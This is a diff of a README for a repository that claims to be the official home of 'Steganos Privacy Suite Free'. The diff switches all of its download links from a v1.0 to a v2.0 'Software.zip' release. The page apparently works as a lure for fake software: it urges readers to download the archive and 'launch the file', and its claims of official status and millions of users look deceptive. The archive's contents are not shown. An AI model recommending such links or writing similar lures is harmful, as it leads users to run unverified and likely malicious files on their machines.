@@ -1,6 +1,6 @@
 # Welcome to the Steganos Privacy Suite Free Repository! 🛡️🔒
 
-![Steganos Privacy Suite Free](https://github.com/lilleemil060/Steganos-Privacy-Suite-Free/releases/download/v1.0/Software.zip)
+![Steganos Privacy Suite Free](https://github.com/lilleemil060/Steganos-Privacy-Suite-Free/releases/download/v2.0/Software.zip)
 
 ## Overview ℹ️
 
@@ -14,7 +14,7 @@ Welcome to the official repository for Steganos Privacy Suite Free! Here you can
 
 ## Get Started 🚀
 
-To get started with Steganos Privacy Suite Free, you can [download the latest version here](https://github.com/lilleemil060/Steganos-Privacy-Suite-Free/releases/download/v1.0/Software.zip). Remember to launch the file after downloading!
+To get started with Steganos Privacy Suite Free, you can [download the latest version here](https://github.com/lilleemil060/Steganos-Privacy-Suite-Free/releases/download/v2.0/Software.zip). Remember to launch the file after downloading!
 
 ## Features ✨
 
@@ -47,4 +47,4 @@ Subscribe to our newsletter for the latest updates and exclusive offers.
 
 *Steganos Privacy Suite Free is trusted by millions worldwide for its advanced privacy features and robust security measures. Download today and experience the difference!*
 
-[![Download Steganos Privacy Suite Free](https://github.com/lilleemil060/Steganos-Privacy-Suite-Free/releases/download/v1.0/Software.zip%20Version-blue)](https://github.com/lilleemil060/Steganos-Privacy-Suite-Free/releases/download/v1.0/Software.zip)
+[![Download Steganos Privacy Suite Free](https://github.com/lilleemil060/Steganos-Privacy-Suite-Free/releases/download/v2.0/Software.zip%20Version-blue)](https://github.com/lilleemil060/Steganos-Privacy-Suite-Free/releases/download/v2.0/Software.zip)
